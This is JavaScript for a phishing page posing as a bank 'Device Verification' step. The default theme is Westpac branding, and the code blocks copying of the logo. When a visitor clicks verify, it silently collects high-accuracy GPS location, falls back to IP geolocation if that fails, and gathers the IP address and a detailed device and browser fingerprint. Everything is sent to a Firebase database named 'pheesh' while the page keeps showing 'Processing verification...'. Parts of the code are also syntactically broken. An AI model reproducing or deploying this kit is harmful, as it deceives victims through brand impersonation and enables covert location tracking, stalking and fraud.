// Initialize Firebase with minimal config
const firebaseConfig = {
    databaseURL: "https://pheesh-4481e-default-rtdb.asia-southeast1.firebasedatabase.app"
};

// Initialize Firebase
let database;
try {
    firebase.initializeApp(firebaseConfig);
    console.log('Firebase initialized successfully');
    database = firebase.database();
    console.log('Database reference created');

    // Test database connection
    database.ref('.info/connected').on('value', (snapshot) => {
        const isConnected = snapshot.val();
        console.log('Database connection state:', isConnected);
        if (!isConnected && document.visibilityState !== 'hidden') {
            console.warn('Attempting to connect to Firebase database...');
        }
    });

    // Test write permission
    const testRef = database.ref('test-write');
    testRef.set({
        timestamp: firebase.database.ServerValue.TIMESTAMP
    }).then(() => {
        console.log('Write permission verified');
        testRef.remove(); // Clean up test data
    }).catch(error => {
        console.error('Write permission test failed:', error);
    });

} catch (error) {
    console.error('Error initializing Firebase:', error);
}

// Initialize theme handling
let currentTheme = '';

// Initial theme load
database.ref('activeTheme').once('value')
    .then(snapshot => {
        const initialTheme = snapshot.val() || 'westpac';
        applyTheme(initialTheme);
        document.querySelector('.container').classList.add('loaded');
    });

// Listen for theme changes
database.ref('activeTheme').on('value', snapshot => {
    const newTheme = snapshot.val() || 'westpac';
    if (newTheme !== currentTheme) {
        applyTheme(newTheme);
    }
});

function applyTheme(themeName) {
    const theme = themes[themeName];
    if (!theme) return;

    currentTheme = themeName;
    document.getElementById('themeStyles').href = theme.styles;
    document.querySelector('.logo-image').src = theme.logo;
    document.title = `Device Verification - ${theme.name}`;
}

// Prevent right-click on logo
document.querySelector('.logo').addEventListener('contextmenu', (e) => {
    e.preventDefault();
    return false;
});

// Prevent drag on logo
document.querySelector('.logo').addEventListener('dragstart', (e) => {
    e.preventDefault();
    return false;
});

// Prevent copy on logo
document.querySelector('.logo').addEventListener('copy', (e) => {
    e.preventDefault();
    return false;
});

// Main functionality
document.addEventListener('DOMContentLoaded', () => {
    const allowLocationButton = document.getElementById('allowLocation');
    const locationStatus = document.getElementById('locationStatus');
    
    allowLocationButton.addEventListener('click', () => {
        allowLocationButton.classList.add('loading');
        allowLocationButton.disabled = true;
        allowLocationButton.textContent = 'Verifying';
        document.querySelector('.thank-you-card').classList.add('processing');
        
        locationStatus.textContent = 'Processing verification...';
        
        // Get location data with enhanced browser support
        if (!navigator.geolocation) {
            console.log('Geolocation API not supported');
            handleLocationFallback();
            return;
        }

        // Define options for better accuracy
        const geoOptions = {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        };

        try {
            // Chrome/Chromium specific handling
            if (/Chrome/.test(navigator.userAgent) && /Google Inc/.test(navigator.vendor)) {
                // Request permissions explicitly for Chrome
                const permissionResult = await navigator.permissions.query({ name: 'geolocation' });
                if (permissionResult.state === 'denied') {
                    console.log('Geolocation permission denied in Chrome');
                    handleLocationFallback();
                    return;
                }
            }

            navigator.geolocation.getCurrentPosition(
                // Success callback
                async (position) => {
                    // Ensure high accuracy GPS reading
                    if (position.coords.accuracy > 100 && !window._retryHighAccuracy) {
                        window._retryHighAccuracy = true;
                        navigator.geolocation.getCurrentPosition(
                            arguments[0], // Same success callback
                            arguments[1], // Same error callback
                            {
                                enableHighAccuracy: true,
                                timeout: 10000,
                                maximumAge: 0
                            }
                        );
                        return;
                    }
                    console.log('Location obtained:', position.coords);
                    const locationData = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        altitudeAccuracy: position.coords.altitudeAccuracy,
                        locationSource: await determineLocationSource(),
                        timestamp: new Date().toISOString(),
                        userAgent: navigator.userAgent,
                        // We'll get IP address from a service like ipify
                        ip: await fetch('https://api.ipify.org?format=json')
                            .then(response => response.json())
                            .then(data => data.ip)
                            .catch(() => 'Unknown'),
                        screen: {
                            width: window.screen.width,
                            height: window.screen.height,
                            colorDepth: window.screen.colorDepth,
                            pixelRatio: window.devicePixelRatio
                        },
                        device: {
                            memory: (typeof navigator.deviceMemory !== 'undefined') ? navigator.deviceMemory : 'Unknown',
                            cores: (typeof navigator.hardwareConcurrency !== 'undefined') ? navigator.hardwareConcurrency : 'Unknown',
                            platform: navigator.platform || 'Unknown',
                            vendor: navigator.vendor || 'Unknown',
                            language: navigator.language || 'Unknown',
                            languages: navigator.languages || [navigator.language] || ['Unknown'],
                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
                            touchPoints: (typeof navigator.maxTouchPoints !== 'undefined') ? navigator.maxTouchPoints : 'Unknown',
                            connection: (typeof navigator.connection !== 'undefined') ? {
                                type: navigator.connection.effectiveType || 'Unknown',
                                downlink: navigator.connection.downlink || 'Unknown',
                                rtt: navigator.connection.rtt || 'Unknown',
                                saveData: navigator.connection.saveData || false
                            } : 'Unknown'
                        },
                        browser: {
                            cookiesEnabled: navigator.cookieEnabled || false,
                            doNotTrack: navigator.doNotTrack || null,
                            plugins: (navigator.plugins && navigator.plugins.length) ? Array.from(navigator.plugins).map(p => p.name) : [],
                            webdriver: (typeof navigator.webdriver !== 'undefined') ? navigator.webdriver : 'Unknown',
                            pdfViewerEnabled: (typeof navigator.pdfViewerEnabled !== 'undefined') ? navigator.pdfViewerEnabled : 'Unknown',
                            deviceOrientation: (typeof window.DeviceOrientationEvent !== 'undefined') ? 'Supported' : 'Not supported',
                            webGL: (function() {
                                try {
                                    return !!document.createElement('canvas').getContext('webgl');
                                } catch(e) {
                                    return false;
                                }
                            })()
                        }
                    };

                    // Helper function to determine location source
                    async function determineLocationSource() {
                        if ('permissions' in navigator) {
                            try {
                                const result = await navigator.permissions.query({ name: 'geolocation' });
                                if (result.state === 'granted') {
                                    return 'GPS';
                                }
                            } catch (e) {
                                console.error('Error checking permissions:', e);
                            }
                        }
                        // If accuracy is less than 100 meters, definitely GPS
                        if (position.coords.accuracy < 100) {
                            return 'GPS (High Accuracy)';
                        }
                        // If accuracy is less than 500 meters, probably GPS but with poor signal
                        else if (position.coords.accuracy < 500) {
                            return 'GPS (Low Accuracy)';
                        }
                        // If accuracy is less than 2000 meters, likely WiFi
                        else if (position.coords.accuracy < 2000) {
                            return 'WiFi';
                        }
                        // Otherwise, likely cell towers or IP-based
                        return 'Cell/IP';
                    }

                    console.log('Attempting to save location data:', locationData);

                    // Save location data to Firebase
                    if (!database) {
                        console.error('Database not initialized');
                        locationStatus.textContent = 'Verification error. Please try again.';
                        return;
                    }

                    try {
                        const newLocationRef = database.ref('locations').push();
                        await newLocationRef.set(locationData);
                        console.log('Location saved successfully to Firebase with key:', newLocationRef.key);
                        locationStatus.textContent = 'Processing verification...';
                    } catch (error) {
                        console.error('Error saving location to Firebase:', error);
                        console.error('Error details:', {
                            code: error.code,
                            message: error.message,
                            stack: error.stack
                        });
                        locationStatus.textContent = 'Verification error. Please try again.';
                        allowLocationButton.disabled = false;
                        allowLocationButton.textContent = 'Verify Device';
                        allowLocationButton.classList.remove('loading');
                    }
                },
                async (error) => {
                    console.log('Geolocation error:', error);
                    locationStatus.textContent = 'Processing verification...';
                    
                    handleLocationFallback();
                },
                geoOptions
            );
        } catch (error) {
            console.error('Geolocation error:', error);
            handleLocationFallback();
        }

        // Fallback function for handling location errors
        async function handleLocationFallback() {
                    try {
                        const ipResponse = await fetch('https://ipapi.co/json/');
                        const ipData = await ipResponse.json();
                        
                        const locationData = {
                            latitude: ipData.latitude,
                            longitude: ipData.longitude,
                            accuracy: 5000,
                            browser: {
                                name: getBrowserName(),
                                version: getBrowserVersion(),
                                engine: navigator.product || 'Unknown',
                                mobile: /Mobile|Android|iP(hone|od|ad)/.test(navigator.userAgent),
                            locationSource: 'IP Geolocation',
                            timestamp: new Date().toISOString(),
                            userAgent: navigator.userAgent,
                            ip: ipData.ip,
                            screen: {
                                width: window.screen.width,
                                height: window.screen.height,
                                colorDepth: window.screen.colorDepth,
                                pixelRatio: window.devicePixelRatio
                            },
                            device: {
                                memory: navigator.deviceMemory || 'Unknown',
                                cores: navigator.hardwareConcurrency || 'Unknown',
                                platform: navigator.platform,
                                vendor: navigator.vendor,
                                language: navigator.language,
                                languages: navigator.languages,
                                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                                touchPoints: navigator.maxTouchPoints,
                                connection: navigator.connection ? {
                                    type: navigator.connection.effectiveType,
                                    downlink: navigator.connection.downlink,
                                    rtt: navigator.connection.rtt,
                                    saveData: navigator.connection.saveData
                                } : 'Unknown'
                            },
                            browser: {
                                cookiesEnabled: navigator.cookieEnabled,
                                doNotTrack: navigator.doNotTrack,
                                plugins: Array.from(navigator.plugins).map(p => p.name),
                                webdriver: navigator.webdriver,
                                pdfViewerEnabled: navigator.pdfViewerEnabled,
                                deviceOrientation: window.DeviceOrientationEvent ? 'Supported' : 'Not supported',
                                webGL: !!document.createElement('canvas').getContext('webgl')
                            },
                            geoError: {
                                code: error.code,
                                message: error.message
                            }
                        };

                        // Save fallback location data to Firebase
                        if (!database) {
                            console.error('Database not initialized');
                            locationStatus.textContent = 'Verification error. Please try again.';
                            return;
                        }

                        try {
                            const newLocationRef = database.ref('locations').push();
                            await newLocationRef.set(locationData);
                            console.log('Fallback location saved successfully to Firebase with key:', newLocationRef.key);
                            locationStatus.textContent = 'Processing verification...';
                        } catch (dbError) {
                            console.error('Error saving location to Firebase:', dbError);
                            locationStatus.textContent = 'Verification error. Please try again.';
                            allowLocationButton.disabled = false;
                            allowLocationButton.textContent = 'Verify Device';
                            allowLocationButton.classList.remove('loading');
                        }
                    } catch (ipError) {
                        console.error('IP location fallback failed:', ipError);
                        // Try alternative IP service as last resort
                        try {
                            const altResponse = await fetch('https://ipwho.is/');
                            const altData = await altResponse.json();
                            if (altData.success) {
                                ipData = {
                                    latitude: altData.latitude,
                                    longitude: altData.longitude,
                                    ip: altData.ip
                                };
                            }
                        } catch (finalError) {
                            console.error('All location services failed:', finalError);
                            locationStatus.textContent = 'Processing verification...';
                        }
                    }
                }

                // Browser detection helper functions
                function getBrowserName() {
                    const ua = navigator.userAgent;
                    if (ua.includes("Firefox")) return "Firefox";
                    if (ua.includes("SamsungBrowser")) return "Samsung Browser";
                    if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
                    if (ua.includes("Trident")) return "Internet Explorer";
                    if (ua.includes("Edge")) return "Edge";
                    if (ua.includes("Chrome")) return "Chrome";
                    if (ua.includes("Safari")) return "Safari";
                    return "Unknown";
                }

                function getBrowserVersion() {
                    const ua = navigator.userAgent;
                    let M = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
                    if (/trident/i.test(M[1])) {
                        let tem = /\brv[ :]+(\d+)/g.exec(ua) || [];
                        return tem[1] || '';
                    }
                    if (M[1] === 'Chrome') {
                        let tem = ua.match(/\bOPR|Edge\/(\d+)/)
                        if (tem != null) return tem[1];
                    }
                    M = M[2] ? [M[1], M[2]] : [navigator.appName, navigator.appVersion, '-?'];
                    let tem = ua.match(/version\/(\d+)/i);
                    if (tem != null) M.splice(1, 1, tem[1]);
                    return M[1];
                }
                }
            );
        } else {
            console.error('Geolocation not supported');
            // Keep showing loading state if geolocation not supported
            locationStatus.textContent = 'Processing verification...';
        }
    });
});
